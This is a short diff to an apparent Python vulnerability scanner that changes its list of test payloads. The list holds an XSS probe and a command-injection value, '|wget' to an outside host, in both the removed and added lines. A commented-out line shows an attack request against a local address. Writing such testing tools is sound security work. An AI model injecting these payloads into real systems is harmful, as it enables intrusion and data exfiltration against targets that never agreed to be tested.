@@ -70,7 +70,7 @@ class test_vul:
             print('#xss:'+url)
             print(r.text)
 if '__main__' == __name__:
-    payload=['<\'\"xssguimaizi>','|wget http://www.guimaizi.com/getdata/save_data.php?pwd=k40seKJp']
+    payload=['<\'\"xssguimaizi>','|wget http://www.guimaizi.com/']
     for i in payload:
         item=test_vul(i)
     #item.attack_post('http://192.168.0.136/test_vul.php?aasdas=dsadas&xss=aa&13dsada=dsa','post_vul=dasxsssda')
